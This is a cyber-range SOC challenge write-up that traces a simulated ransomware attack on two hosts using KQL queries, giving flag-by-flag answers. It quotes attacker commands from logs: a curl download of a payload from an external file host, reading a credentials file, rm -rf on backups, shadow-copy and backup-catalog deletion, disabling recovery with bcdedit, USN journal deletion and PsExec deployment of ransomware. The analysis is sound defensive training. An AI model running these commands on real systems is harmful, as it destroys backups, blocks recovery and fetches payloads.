# SOC Incident Investigation – Azuki Import/Export Compromise Part 4

<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/5fd938d8-1e9a-435e-b734-af52e742aa2b" />

**Analyst:** Luka Groff

**Source:** Cyber Range SOC Challenge

**System:** azuki-adminpc & azuki-backupsv

---

## Overview
It's been a week since the initial compromise. You arrive Monday morning to find ransom notes across every system. The threat actors weren't just stealing data - they were preparing for total devastation.

---

## Key Findings

### Lateral Movement
- Source IP: `10.1.0.108`
- Compromised User: `yuki.tanaka`
- Device: `azuki-adminpc`

### Credential Access
- `cat /backups/configs/all-credentials.txt`
- `backup-admin`

### Command and Control
- `curl -L -o destroy.7z hxxps[://]litter[.]catbox[.]moe/io523y[.]7z`

### Execution
- `silentlynx.exe`

### Discovery
- `find /backups -name *.tar.gz`
- `cat /etc/passwd`
- `cat /etc/crontab`
- `ls --color=auto -la /backups/`

### Persistence
- `Microsoft\Windows\Security\SecurityHealthService`
- `WindowsSecurityHealth`

### Defense Evasion
- `"taskkill" /F /IM sqlservr.exe`
- `"fsutil.exe" usn deletejournal /D C:`


### Impact
- `rm -rf /backups/archives`
- `systemctl stop cron`
- `systemctl disable cron`
- `"net" stop VSS /y`
- `"net" stop wbengine /y`
- `"vssadmin" delete shadows /all /quiet`
- `"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB`
- `"bcdedit" /set {default} recoveryenabled No`
- `"wbadmin" delete catalog -quiet`
- `SILENTLYNX_README.txt`

---

## Full Timeline 24th & 25th of November 2025

| Time (UTC) | Flag |	Stage	| Event / Artifact |
|------------|-------|-------|-----------------|
| 2025-11-24 14:14:14 |	**Flag 9** |	Credential Access |	Command to access stored credentials → cat /backups/configs/all-credentials.txt |
| 2025-11-24 14:16:06 |	**Flag 5,6,7** |	Discovery |	Backup archive search command → "find /backups -name *.tar.gz"; enumeration commands → "cat /etc/passwd", "cat /etc/crontab" |
| 2025-11-25 05:39:10 |	**Flag 1** |	Lateral Movement |	emote access command → "ssh.exe" backup-admin@10.1.0.189 |
| 05:39:22 |	**Flag 2,3** |	Lateral Movement & Credential Access |	Source IP → "10.1.0.108" ; account used → backup-admin |
| 05:45:34 |	**Flag 8** |	C2 |	External tools download command → curl -L -o destroy.7z hxxps[://]litter[.]catbox[.]moe/io523y[.]7z |
| 05:47:02 |	**Flag 10** |	Impact |	Command used to destroy backups → rm -rf /backups/archives |
| 05:47:03 |	**Flag 11,12** |	Impact |	Commands used to stop and disable backup service → systemctl stop cron & systemctl disable cron |
| 05:47:51 |	**Flag 4** |	Discovery |	File System Enumeration → ls --color=auto -la /backups/ |
| 06:03:47 |	**Flag 13** |	Lateral Movement |	Tool used to execute remote commands → PsExec64.exe |
| 06:04:40 |	**Flag 14,15** |	Lateral Movement & Execution |	Full deployment command → "PsExec64.exe" \\10.1.0.188 -u fileadmin -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe ; Payload deployed → silentlynx.exe|
| 06:04:53 |	**Flag 16** |	Impact |	Command used to stop shadow copy service → "net" stop VSS /y |
| 06:04:54 |	**Flag 17** |	Impact |	Command used to stop backup engine → "net" stop wbengine /y |
| 06:04:57 |	**Flag 18** |	Defense Evasion |	Command used to terminate process to unlock files → "taskkill" /F /IM sqlservr.exe |
| 06:04:59 |	**Flag 19** |	Impact |	Command used to delete recovery points → "vssadmin" delete shadows /all /quiet |
| 06:04:59 |	**Flag 20** |	Impact |	Command used to limit recovery storage → "vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB |
| 06:04:59 |	**Flag 21** |	Impact |	Command used to disable system recovery → "bcdedit" /set {default} recoveryenabled No |
| 06:05:00|	**Flag 22** |	Impact |	Command used to delete the backup catalogue → "wbadmin" delete catalog -quiet |
| 06:05:01 |	**Flag 23,24** |	Persistence |	Scheduled task name & registry value → Microsoft\Windows\Security\SecurityHealthService & WindowsSecurityHealth |
| 06:05:01 |	**Flag 26** |	Impact |	ransom note filename  → SILENTLYNX_README.txt |
| 06:10:04 |	**Flag 25** |	Defense Evasion |	Command used to delete forensic evidence → "fsutil.exe" usn deletejournal /D C: |

---

## Flag by flag answers

## 🚩 Flag 1: LATERAL MOVEMENT - Remote Access

Question: What remote access command was executed from the compromised workstation?

- Answer flag 1: "ssh.exe" backup-admin@10.1.0.189

Query used: (Timestamp filtered for 25th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-"
| project TimeGenerated, AccountDomain, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine
| where ProcessCommandLine contains "ssh" and ProcessCommandLine !contains "msedge"
| order by TimeGenerated asc 
```

<img width="800" height="460" alt="image" src="https://github.com/user-attachments/assets/070cae92-494d-429f-94e4-8d8c02cedd1f" />

After inspecting all the ssh login commands on all the azuki compromised hosts, I came across 2 commands, one used in the earlier attack (part 3) and the second one was used on the 25th of November. 

---

## 🚩 Flag 2 & 3: LATERAL MOVEMENT - Attack Source & CREDENTIAL ACCESS - Compromised Account

Question 2: What IP address initiated the connection to the backup server?

- Answer flag 2: 10.1.0.108

Question 3: What account was used to access the backup server?

- Answer flag 3: backup-admin

Query used: (Timestamp filtered for 25th of November)
```
DeviceLogonEvents
| where DeviceName contains "azuki-backup"
| project TimeGenerated, AccountDomain, AccountName, ActionType, AdditionalFields, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessParentFileName, RemoteIP, RemoteIPType
| order by TimeGenerated asc  
```

<img width="800" height="618" alt="image" src="https://github.com/user-attachments/assets/ba513613-cffe-421a-86bf-046bf319db87" />

After the successfull ssh connection, I looked into the logon events for the breached backup server and found the source or Remote IP and from the evidence in flag 1 already we can see that the threat actor was targeting backup-admin account.

---

## 🚩 Flag 4: DISCOVERY - Directory Enumeration

Question: What command listed the backup directory contents?

- Answer flag 4: ls --color=auto -la /backups/

Query used: (Timestamp filtered for 25th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-backup"
| project TimeGenerated, AccountDomain, AccountName, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
| where FileName contains "ls"
| order by TimeGenerated asc 
```

<img width="800" height="456" alt="image" src="https://github.com/user-attachments/assets/d64e330b-b1ad-4229-a543-8895400c9000" />

The threat actor listed the contents of the backups directory.

---

## 🚩 Flag 5: DISCOVERY - File Search

Question: What command searched for backup archives?

- Answer flag 5: find /backups -name *.tar.gz

Query used: (Timestamp filtered for 24th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-backup"
| project TimeGenerated, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine
| where FileName has_any ("find")
| where ProcessCommandLine has_any (".tar", ".tar.gz", ".zip", ".bak")
| order by TimeGenerated asc
```

<img width="800" height="456" alt="image" src="https://github.com/user-attachments/assets/19d5e73d-f893-455e-a1f2-1024bcc68adc" />

The command was used to find files in the backups directory that end with .tar.gz which is an archive file.

---

## 🚩 Flag 6: DISCOVERY - Account Enumeration

Question: What command enumerated local accounts?

- Answer flag 6: cat /etc/passwd

Query used: (Timestamp filtered for 24th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-backup"
| project TimeGenerated, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine
| where FileName has_any ("cat")
| order by TimeGenerated asc 
```

<img width="800" height="342" alt="image" src="https://github.com/user-attachments/assets/067adac9-e0fd-42d6-8c1b-96e7769bb172" />

The cat command was used to look into /etc/passwd file which contains all the usernames on the system.

---

## 🚩 Flag 7: DISCOVERY - Scheduled Job Reconnaissance

Question: What command revealed scheduled jobs on the system?

- Answer flag 7: cat /etc/crontab

Query used: (Timestamp filtered for 24th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-backup"
| project TimeGenerated, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine
| where FileName has_any ("cat")
| order by TimeGenerated asc 
```

<img width="800" height="340" alt="image" src="https://github.com/user-attachments/assets/08948b89-e3ec-4c87-8a7e-aacd60a4eae1" />

The cat command was used to look into the scheduled tasks which are always in the cron or crontab file in the linux systems.

---

## 🚩 Flag 8: COMMAND AND CONTROL - Tool Transfer

Question: What command downloaded external tools?

- Answer flag 8: curl -L -o destroy.7z hxxps[://]litter[.]catbox[.]moe/io523y[.]7z

Query used: (Timestamp filtered for 25th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-backup"
| project TimeGenerated, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine
| where FileName has_any ("curl", "wget")
| order by TimeGenerated asc
```

<img width="800" height="446" alt="image" src="https://github.com/user-attachments/assets/d51da669-8292-446c-8446-50c139a785c3" />

The threat actor used the curl command to access the abovementioned website through a CLI and downloaded a malicious file.

---

## 🚩 Flag 9: CREDENTIAL ACCESS - Credential Theft

Question: What command accessed stored credentials?

- Answer flag 9: cat /backups/configs/all-credentials.txt
  
Query used: (Timestamp filtered for 24th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-backup"
| project TimeGenerated, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine
| where FileName has_any ("cat", "grep", "strings", "ls", "cat", "head", "tail")
| order by TimeGenerated asc 
```

<img width="800" height="462" alt="image" src="https://github.com/user-attachments/assets/32ef9306-827b-4f43-96fe-bb2b52bb42c9" />

The cat command was used to again to look into a file called all-credentials.txt. The threat actor wanted to gain access with these credentials for lateral movement.

---

## 🚩 Flag 10: IMPACT - Data Destruction

Question: What command destroyed backup files?

- Answer flag 10: rm -rf /backups/archives
  
Query used: (Timestamp filtered for 25th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-backup"
| project TimeGenerated, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine
| where FileName has_any ("rm")
| order by TimeGenerated asc 
```

<img width="1000" height="450" alt="image" src="https://github.com/user-attachments/assets/1a5abd55-420a-46c3-8809-10b07001c82c" />

Since the goal of the threat actor was ransomware, which means file encryption, in order for the victim to pay for decryption, the threat actor deleted the backup files to prevent the victim from formatting the server and uploading the backed up files.

---

## 🚩 Flag 11: IMPACT - Service Stopped

Question: What command stopped the backup service?

- Answer flag 11: systemctl stop cron
  
Query used: (Timestamp filtered for 25th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-backup"
| project TimeGenerated, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine
| where ProcessCommandLine has_any ("stop")
| order by TimeGenerated asc 
```

<img width="800" height="452" alt="image" src="https://github.com/user-attachments/assets/7b4238e2-8cb5-4143-9ba1-362036d5e23d" />

The threat actor stopped all backup services as well to prevent the victim to backup the server. 

---

## 🚩 Flag 12: IMPACT - Service Disabled

Question: What command permanently disabled the backup service?

- Answer flag 12: systemctl disable cron
  
Query used: (Timestamp filtered for 25th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-backup"
| project TimeGenerated, AccountDomain, AccountName, DeviceName, FileName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine
| where ProcessCommandLine has_any ("cron")
| order by TimeGenerated asc 
```

<img width="800" height="448" alt="image" src="https://github.com/user-attachments/assets/fd73dc2c-64e5-408e-ac07-fbde52e26ce4" />

Once again, the threat actor made sure the backup service is completely disabled.

---

## 🚩 Flags 13, 14, 15: LATERAL MOVEMENT - Remote Execution & Deployment Command ; EXECUTION - Malicious Payload

Question 13: What tool executed commands on remote systems?

- Answer flag 13: PsExec64.exe

Question 14: What is the full deployment command?

- Answer flag 13: "PsExec64.exe" \\10.1.0.188 -u fileadmin -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe

Question 15: What payload was deployed?

- Answer flag 13: silentlynx.exe

  
Query used: (Timestamp filtered for 25th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-admin"
| project TimeGenerated, AccountDomain, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc 
```

<img width="800" height="456" alt="image" src="https://github.com/user-attachments/assets/cb106d94-7f15-4fac-9d90-b58724f13e1c" />

I found a very suspicious command within the temp/cache folder that indicated remote execution with the help of PsExec64.exe tool that deployed a malicious executable, silentlynx.exe.

---

## 🚩 Flags 16, 17, 18, 19, 20, 21, 22:  IMPACT - Shadow Service Stopped, Backup Engine Stopped, Recovery Point Deletion, Storage Limitation, Recovery Disabled, Catalog Deletion & DEFENSE EVASION - Process Termination

Question 16: What command stopped the shadow copy service?

- Answer flag 16: "net" stop VSS /y

Question 17: What command stopped the backup engine?

- Answer flag 17: "net" stop wbengine /y

Question 18: What command terminated processes to unlock files?

- Answer flag 18: "taskkill" /F /IM sqlservr.exe

Question 19: What command deleted recovery points?

- Answer flag 19: "vssadmin" delete shadows /all /quiet

Question 20: What command limited recovery storage?

- Answer flag 20: "vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB

Question 21: What command disabled system recovery?

- Answer flag 21: "bcdedit" /set {default} recoveryenabled No

Question 22: What command deleted the backup catalogue?

- Answer flag 22: "wbadmin" delete catalog -quiet
  
  
Query used: (Timestamp filtered for 25th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-admin"
| project
    TimeGenerated,
    AccountDomain,
    AccountName,
    DeviceName,
    FileName,
    ProcessCommandLine,
    FolderPath,
    InitiatingProcessCommandLine
| order by TimeGenerated asc
```

<img width="600" height="796" alt="image" src="https://github.com/user-attachments/assets/aa3f589c-379a-408c-b092-eacd668cc887" />

<img width="600" height="792" alt="image" src="https://github.com/user-attachments/assets/82da616d-3544-4bde-b5f8-f735221f12f5" />

<img width="600" height="746" alt="image" src="https://github.com/user-attachments/assets/a144dff1-3417-4877-9544-435a2afa73b7" />

The threat actor executed a systematic pre-encryption impact and defense-evasion sequence consistent with ransomware-style operations. After initial execution (silentlynx.exe), they disabled Windows recovery mechanisms, terminated critical services and processes, and destroyed backup artifacts to prevent system restoration and file recovery.

Specifically, the attacker: 
- Stopped Volume Shadow Copy Service (VSS) and Windows Backup Engine to block snapshot creation.
- Force-terminated database and productivity processes (SQL Server, MySQL, Oracle, PostgreSQL, MongoDB, Outlook, Excel) to unlock files for encryption.
- Deleted all existing shadow copies and backup catalogs, eliminating recovery points.
- Disabled Windows recovery via boot configuration changes.
- Restricted shadow storage size to prevent future snapshot creation.
- Leveraged living-off-the-land binaries (LOLBins) such as net.exe, taskkill.exe, vssadmin.exe, wbadmin.exe, and bcdedit.exe for stealth and reliability.

Overall, this activity demonstrates high-confidence malicious intent, focused on maximizing impact, preventing recovery, and evading defenses, strongly aligning with ransomware deployment tactics.

---

## 🚩 Flag 23: PERSISTENCE - Registry Autorun

Question: What registry value establishes persistence?

- Answer flag 23: WindowsSecurityHealth
  
Query used: (Timestamp filtered for 25th of November)
```
DeviceRegistryEvents
| where DeviceName contains "azuki-admin"
| project TimeGenerated, RegistryKey, RegistryValueName, ActionType, DeviceName, InitiatingProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

<img width="900" height="394" alt="image" src="https://github.com/user-attachments/assets/ef98b006-f150-4558-b983-a81d6b072953" />

---

## 🚩 Flag 24: PERSISTENCE - Scheduled Execution

Question: What scheduled task was created?

- Answer flag 24: Microsoft\Windows\Security\SecurityHealthService
  
Query used: (Timestamp filtered for 25th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-admin"
| project
    TimeGenerated,
    AccountDomain,
    AccountName,
    DeviceName,
    FileName,
    ProcessCommandLine,
    FolderPath,
    InitiatingProcessCommandLine
| order by TimeGenerated asc
```

<img width="900" height="446" alt="image" src="https://github.com/user-attachments/assets/6228f054-54a2-47d0-91be-55cbe9ed66b6" />

In both flag 23 and 24 we can see the threat actor established persistence with a scheduled task called WindowsSecurityHealth within Microsoft\Windows\Security\ so it can blend in well with the Microsoft, Windows logs. The task actually runs the malware binary on every logon and makes sure it stays there.

---

## 🚩 Flag 25: DEFENSE EVASION - Journal Deletion

Question: What command deleted forensic evidence?

- Answer flag 25: "fsutil.exe" usn deletejournal /D C:
  
Query used: (Timestamp filtered for 25th of November)
```
DeviceProcessEvents
| where DeviceName contains "azuki-admin"
| project
    TimeGenerated,
    AccountDomain,
    AccountName,
    DeviceName,
    FileName,
    ProcessCommandLine,
    FolderPath,
    InitiatingProcessCommandLine
| order by TimeGenerated asc
```

<img width="650" height="452" alt="image" src="https://github.com/user-attachments/assets/ee0ebfa0-1acb-42af-9a40-52071124604d" />

The threat actor deleted important files, NTFS USN Change Journal on drive C:, erasing file system change history to hinder forensic analysis and recovery.

---

## 🚩 Flag 26: IMPACT - Ransom Note

Question: What is the ransom note filename?

- Answer flag 26: SILENTLYNX_README.txt
  
Query used: (Timestamp filtered for 25th of November)
```
DeviceFileEvents
| where DeviceName contains "azuki-admin"
| where ActionType == "FileCreated"
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by TimeGenerated asc
```

<img width="650" height="286" alt="image" src="https://github.com/user-attachments/assets/ae6d4233-3946-47fe-b2df-5ebaaf284321" />

The threat actor left a random note for the victim to see and follow the instructions on it to possibly pay the fee to decrypt the files.
